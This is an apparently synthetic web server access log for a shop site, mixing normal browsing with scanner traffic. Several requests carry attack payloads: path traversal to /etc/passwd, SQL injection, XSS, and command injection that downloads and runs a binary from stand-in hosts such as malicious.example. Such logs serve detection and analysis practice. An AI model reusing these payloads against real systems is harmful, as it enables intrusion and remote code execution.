10.0.0.24 - - [21/May/2026:15:47:37 +0000] "GET /cart HTTP/1.1" 200 6396 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:09:12:11 +0000] "GET /search?q=phone HTTP/1.1" 200 584 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:16:09:53 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 6324 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:16:48:46 +0000] "GET /admin/login HTTP/1.1" 403 883 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:12:35:28 +0000] "GET /admin/login HTTP/1.1" 404 185 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:14:30:11 +0000] "GET / HTTP/1.1" 200 3310 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:11:17:25 +0000] "GET /products/12 HTTP/1.1" 200 1985 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:11:11:46 +0000] "GET /index.html HTTP/1.1" 200 7368 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:20:05:09 +0000] "GET /products/43 HTTP/1.1" 200 1854 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:11:57:42 +0000] "GET /static/js/app.js HTTP/1.1" 200 4485 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:19:17:28 +0000] "GET /search?q=phone HTTP/1.1" 200 6035 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:13:01:10 +0000] "GET /static/js/app.js HTTP/1.1" 200 8504 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:08:02:58 +0000] "POST /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 548 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.155.205.33 - - [21/May/2026:15:43:33 +0000] "POST /phpmyadmin HTTP/1.1" 401 603 "-" "ffuf/2.1.0"
192.168.1.10 - - [21/May/2026:11:13:09 +0000] "GET /products/43 HTTP/1.1" 200 5710 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:08:08:09 +0000] "GET /search?q=phone HTTP/1.1" 200 7184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.44 - - [21/May/2026:15:13:40 +0000] "GET /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 403 885 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:15:41:28 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 6171 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:09:23:38 +0000] "GET /api/v1/status HTTP/1.1" 200 2160 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.45 - - [21/May/2026:12:36:48 +0000] "GET /redirect?url=http%3A%2F%2Fevil.example%2Fphish HTTP/1.1" 403 687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:14:38:22 +0000] "GET /products HTTP/1.1" 200 8941 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:17:05:32 +0000] "POST /api/v1/user/profile HTTP/1.1" 200 2549 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:16:36:39 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 3633 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [21/May/2026:15:38:02 +0000] "GET /static/css/style.css HTTP/1.1" 200 5954 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:14:35:41 +0000] "GET /api/v1/status HTTP/1.1" 200 3771 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
185.220.101.45 - - [21/May/2026:14:59:23 +0000] "POST /wp-content/plugins/ HTTP/1.1" 403 465 "-" "Skipfish/2.10b"
172.16.0.44 - - [21/May/2026:17:01:33 +0000] "GET /search?q=%22%20OR%20%221%22%3D%221 HTTP/1.1" 403 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:15:15:04 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 8250 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.10 - - [21/May/2026:15:29:25 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 302 721 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
185.220.101.45 - - [21/May/2026:08:39:58 +0000] "HEAD /shell?cd+/tmp;wget+http://malicious.example/bin;chmod+777+bin;./bin HTTP/1.1" 403 538 "-" "Hydra"
45.155.205.33 - - [21/May/2026:13:05:35 +0000] "GET /shell?cd+/tmp;wget+http://malicious.example/bin;chmod+777+bin;./bin HTTP/1.1" 404 738 "-" "Hydra"
10.0.0.24 - - [21/May/2026:14:54:13 +0000] "GET /cart HTTP/1.1" 200 1802 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.78 - - [21/May/2026:10:27:30 +0000] "POST /phpmyadmin HTTP/1.1" 403 929 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:12:58:29 +0000] "GET /products/43 HTTP/1.1" 302 637 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.46 - - [21/May/2026:13:42:42 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
91.240.118.172 - - [21/May/2026:19:18:41 +0000] "GET /phpmyadmin HTTP/1.1" 404 862 "-" "ffuf/2.1.0"
192.168.1.12 - - [21/May/2026:15:36:10 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 1275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:09:11:36 +0000] "GET /static/css/style.css HTTP/1.1" 200 4123 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.78 - - [21/May/2026:14:21:58 +0000] "GET /admin/login HTTP/1.1" 200 1236 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:19:36:46 +0000] "GET /search?q=laptop HTTP/1.1" 200 3419 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.46 - - [21/May/2026:09:03:30 +0000] "GET /product?id=1%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1" 500 287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:19:35:39 +0000] "POST /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.44 - - [21/May/2026:18:29:27 +0000] "GET /redirect?url=http%3A%2F%2Fevil.example%2Fphish HTTP/1.1" 403 674 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:14:27:15 +0000] "GET / HTTP/1.1" 200 2242 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:13:09:43 +0000] "GET /contact HTTP/1.1" 200 1877 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:16:25:57 +0000] "GET /products/12 HTTP/1.1" 200 1267 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:09:16:26 +0000] "GET /api/v1/user/profile HTTP/1.1" 302 367 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:09:09:31 +0000] "GET /about HTTP/1.1" 200 7098 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:17:25:05 +0000] "GET / HTTP/1.1" 200 1801 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:18:05:01 +0000] "GET /administrator HTTP/1.1" 401 1034 "-" "gobuster/3.6"
10.0.0.24 - - [21/May/2026:11:36:37 +0000] "GET /about HTTP/1.1" 200 5487 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:19:32:59 +0000] "GET /static/img/logo.png HTTP/1.1" 200 7902 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:08:19:15 +0000] "GET /products/43 HTTP/1.1" 200 1242 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:09:08:28 +0000] "GET /db.sql HTTP/1.1" 403 889 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.79 - - [21/May/2026:16:20:45 +0000] "POST /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 404 83 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:16:49:03 +0000] "GET /wp-admin/ HTTP/1.1" 403 487 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:13:19:48 +0000] "GET /static/css/style.css HTTP/1.1" 200 2700 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
185.220.101.45 - - [21/May/2026:11:35:41 +0000] "GET /product?id=1%20UNION%20SELECT%201,2,3-- HTTP/1.1" 302 766 "-" "Hydra"
10.0.0.23 - - [21/May/2026:09:19:06 +0000] "GET /search?q=laptop HTTP/1.1" 200 5224 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.155.205.33 - - [21/May/2026:09:34:26 +0000] "POST /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 665 "-" "ffuf/2.1.0"
192.168.1.12 - - [21/May/2026:09:26:40 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 7467 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.21 - - [21/May/2026:10:44:53 +0000] "GET /products/43 HTTP/1.1" 404 777 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:10:33:22 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 8578 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:16:38:58 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 8825 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:16:20:04 +0000] "GET /search?q=laptop HTTP/1.1" 200 8717 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
91.240.118.172 - - [21/May/2026:09:58:32 +0000] "GET /search?q=%22%20OR%20%221%22%3D%221 HTTP/1.1" 403 983 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
10.0.0.23 - - [21/May/2026:08:09:09 +0000] "GET /cart HTTP/1.1" 200 2844 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.46 - - [21/May/2026:08:10:34 +0000] "POST /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 403 773 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:09:13:40 +0000] "GET / HTTP/1.1" 200 1708 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:12:50:35 +0000] "GET /static/js/app.js HTTP/1.1" 200 8822 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:14:41:28 +0000] "GET /static/img/logo.png HTTP/1.1" 200 2204 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:13:22:49 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 7297 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:14:01:12 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:14:42:19 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 4610 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
185.220.101.45 - - [21/May/2026:14:48:19 +0000] "GET /server-status HTTP/1.1" 404 77 "-" "Hydra"
91.240.118.172 - - [21/May/2026:09:59:29 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 403 520 "-" "Nikto/2.5.0"
10.0.0.24 - - [21/May/2026:16:52:17 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 7400 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:12:22:01 +0000] "GET /products HTTP/1.1" 200 5862 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:08:22:24 +0000] "GET /about HTTP/1.1" 200 5021 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
45.155.205.33 - - [21/May/2026:13:33:16 +0000] "GET /administrator HTTP/1.1" 200 1770 "-" "WPScan v3.8.25"
203.0.113.12 - - [21/May/2026:18:02:47 +0000] "GET /contact HTTP/1.1" 200 6429 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.44 - - [21/May/2026:11:10:34 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 769 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:16:34:37 +0000] "GET /products/43 HTTP/1.1" 302 370 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:13:32:39 +0000] "GET /static/img/logo.png HTTP/1.1" 200 2322 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.13 - - [21/May/2026:12:46:16 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 3551 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:18:15:38 +0000] "POST /api/v1/user/profile HTTP/1.1" 200 2760 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:15:13:02 +0000] "GET /checkout HTTP/1.1" 200 1772 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:16:22:38 +0000] "GET /contact HTTP/1.1" 200 5841 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:09:29:17 +0000] "GET /static/js/app.js HTTP/1.1" 200 5364 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
91.240.118.172 - - [21/May/2026:12:52:30 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 404 443 "-" "WPScan v3.8.25"
10.0.0.21 - - [21/May/2026:17:28:59 +0000] "GET / HTTP/1.1" 200 1943 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:15:42:31 +0000] "GET /static/js/app.js HTTP/1.1" 200 4014 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.77 - - [21/May/2026:20:05:55 +0000] "GET /server-status HTTP/1.1" 403 512 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:17:44:20 +0000] "GET /wp-login.php HTTP/1.1" 404 732 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:13:53:33 +0000] "GET /api/v1/status HTTP/1.1" 200 5791 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:20:17:07 +0000] "GET /about HTTP/1.1" 200 3621 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:09:49:04 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 1320 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:17:56:20 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 8567 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
185.220.101.45 - - [21/May/2026:10:25:14 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 404 604 "-" "gobuster/3.6"
10.0.0.24 - - [21/May/2026:09:44:01 +0000] "GET /contact HTTP/1.1" 200 5946 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:12:17:08 +0000] "GET /static/img/logo.png HTTP/1.1" 200 2641 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:17:34:12 +0000] "GET /products/43 HTTP/1.1" 200 6751 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:11:59:22 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 6184 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:10:29:54 +0000] "POST /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 650 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:15:20:48 +0000] "GET / HTTP/1.1" 200 3667 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:17:51:39 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 920 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:13:59:47 +0000] "GET /index.html HTTP/1.1" 200 3196 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.21 - - [21/May/2026:16:55:42 +0000] "GET /products/43 HTTP/1.1" 200 8536 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:08:47:27 +0000] "GET /cart HTTP/1.1" 200 1185 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.44 - - [21/May/2026:15:55:49 +0000] "GET /product?id=1%20UNION%20SELECT%201,2,3-- HTTP/1.1" 500 85 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.44 - - [21/May/2026:09:54:59 +0000] "POST /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 200 8175 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:11:52:47 +0000] "GET /static/img/logo.png HTTP/1.1" 200 8627 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.77 - - [21/May/2026:09:45:42 +0000] "POST /api/v1/login HTTP/1.1" 404 1187 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
185.220.101.45 - - [21/May/2026:18:53:54 +0000] "POST /config.php HTTP/1.1" 404 264 "-" "gobuster/3.6"
203.0.113.10 - - [21/May/2026:08:51:35 +0000] "GET /index.html HTTP/1.1" 200 6385 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:19:37:11 +0000] "GET /search?q=phone HTTP/1.1" 302 392 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
